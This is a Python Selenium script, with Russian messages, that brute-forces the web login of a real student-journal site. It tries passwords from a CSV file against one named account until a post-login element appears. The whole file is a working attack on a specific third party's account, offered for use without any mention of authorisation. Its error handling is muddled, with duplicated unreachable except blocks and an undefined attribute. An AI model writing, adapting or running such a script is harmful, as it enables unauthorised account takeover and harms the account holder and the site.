import csv
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from selenium.webdriver.chrome.service import Service

class PasswordBruteForcer:
    def __init__(self, url, login, login_field_selector, password_field_selector, submit_button_selector, webdriver_path):
        self.url = url 
        self.login = login 
        self.login_field_selector = login_field_selector 
        self.password_field_selector = password_field_selector 
        self.submit_button_selector = submit_button_selector 
        self.webdriver_path = webdriver_path 

        service = Service(self.webdriver_path)

        try:
            self.driver = webdriver.Chrome(service=service)
        except WebDriverException as e:
            print(f"Критическая ошибка при инициализации драйвера: {e}")
            print("Убедитесь, что chromedriver.exe находится по указанному пути и соответствует версии вашего Chrome.")
            self.driver = None
            raise

    def attempt_login(self, password, success_indicator_selector, error_indicator_selector):
        try:
            print(f"Переход на страницу: {self.url}")
            self.driver.get(self.url)

            wait = WebDriverWait(self.driver, 30)

            print("Ожидание элементов формы...")
            login_field = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, self.login_field_selector)))
            print(f"Поле логина найдено: {self.login_field_selector}")
            password_field = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, self.password_field_selector)))
            print(f"Поле пароля найдено: {self.password_field_selector}")
            submit_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, self.submit_button_selector)))
            print(f"Кнопка отправки найдена: {self.submit_button_selector}")


            print(f"Ввод логина '{self.login}' и пароля '{password}'...")
            login_field.send_keys(self.login)
            password_field.send_keys(password)

            print("Нажатие кнопки входа...")
            submit_button.click()

            print("Ожидание результата входа (успех или ошибка)...")
            try: 
                wait_result = WebDriverWait(self.driver, 10)
                wait_result.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, success_indicator_selector)) or
                    EC.presence_of_element_located((By.CSS_SELECTOR, error_indicator_selector))
                )
                print("Индикатор результата найден.")

                if self._is_element_present(success_indicator_selector):
                    print(f"Успешный вход с логином: {self.login}, паролем: {password}")
                    return True
                elif self._is_element_present(error_indicator_selector):
                    print(f"Неудачная попытка с паролем: {password} (ошибка)")
                else: 
                    print(f"Неудачная попытка с паролем: {password} (результат не определен после ожидания)")

            except TimeoutException:
                print(f"Неудачная попытка с паролем: {password} (таймаут ожидания индикатора результата)")
                return False 

            return False

        except TimeoutException as e:
            return False
        except NoSuchElementException as e:
            return False
        except Exception as e:
            return False

            return False 


        except TimeoutException as e:
             print(f"Произошла ошибка при попытке входа с паролем {password}: Элементы формы не появились за отведенное время.")
             print(f"Проверьте, правильно ли указан URL ({self.url}) и CSS селекторы ({self.login_field_selector}, {self.password_field_selector}, {self.submit_button_selector}), а также скорость загрузки страницы.")
             return False 

        except NoSuchElementException as e:
             print(f"Произошла ошибка при попытке входа с паролем {password}: Элемент формы не найден по селектору после ожидания.")
             print(f"Проверьте CSS селекторы: логин='{self.login_field_selector}', пароль='{self.password_selector}', кнопка='{self.submit_button_selector}'")
             return False 

        except Exception as e:
            print(f"Произошла НЕОЖИДАННАЯ ошибка при попытке входа с паролем {password}: {e}")
            return False 

    def _is_element_present(self, selector):
        """Проверяет, присутствует ли элемент на странице по заданному селектору."""
        self.driver.implicitly_wait(0)
        try:
            self.driver.find_element(By.CSS_SELECTOR, selector)
            return True 
        except NoSuchElementException:
            return False
        except Exception as e:
            print(f"Произошла ошибка при быстрой проверке наличия элемента {selector}: {e}")
            return False 
        finally:
            self.driver.implicitly_wait(10)


    def brute_force_passwords_from_csv(self, csv_file_path, password_column=0, success_indicator='#logout-button', error_indicator='.error-message'):
        """Читает пароли из CSV файла и пытается выполнить вход."""
        try:
            with open(csv_file_path, 'r', encoding='utf-8') as csvfile:
                reader = csv.reader(csvfile)
                print(f"Начинаю перебор паролей из файла: {csv_file_path}")
                for row in reader:
                    if row and len(row) > password_column:
                        password = row[password_column].strip()
                        if not password: continue 

                        print(f"=== Попытка с паролем: {password} ===") 
                        if self.attempt_login(password, success_indicator, error_indicator):
                            print(f"*** ПАРОЛЬ НАЙДЕН: {password} ***") 
                            return

                print("Перебор завершен. Пароль не найден в предоставленном списке.") 

        except FileNotFoundError:
            print(f"Ошибка: Файл '{csv_file_path}' не найден.")
        except Exception as e:
            print(f"Произошла критическая ошибка при чтении файла паролей или выполнении цикла: {e}")


    def close_browser(self):
        """Закрывает окно браузера."""
        if self.driver:
            try:
                self.driver.quit() 
                print("Браузер закрыт.")
            except Exception as e:
                print(f"Произошла ошибка при закрытии браузера: {e}")
        else:
             print("Браузер не был запущен или инициализация драйвера не удалась.")


webdriver_path = r'C:\Users\Родион\Downloads\chromedriver-win64\chromedriver.exe'

target_url = 'https://journal.top-academy.ru/' 

known_login = 'Rogac_ei89'

login_selector = '#username' 

password_selector = '#password' 

submit_selector = 'button[type="submit"]'


passwords_file = 'passwords.csv' 

success_selector = 'body > mystat > ng-component > ng-component > div > div.content > div.pos-f-t > top-pane > nav > div.left-block > span.user-full-name > span.profile-link > a' # !!! ЗАМЕНИТЕ на селектор элемента, уникального для страницы после успешного входа !!!
error_selector = '#\31  > form > div.form-group.mt-5.mx-3 > div > div' 


brute_forcer = None
try:
    brute_forcer = PasswordBruteForcer(
        target_url, known_login, login_selector,
        password_selector, submit_selector, webdriver_path
    )
    if brute_forcer.driver:
        brute_forcer.brute_force_passwords_from_csv(
            passwords_file,
            password_column=0,
            success_indicator=success_selector,
            error_indicator=error_selector
        )
    else:
        print("Драйвер не был успешно инициализирован, перебор не выполнен.")

except Exception as e:
    print(f"Произошла критическая ошибка при инициализации или выполнении: {e}")

finally:
    
    if brute_forcer:
        brute_forcer.close_browser()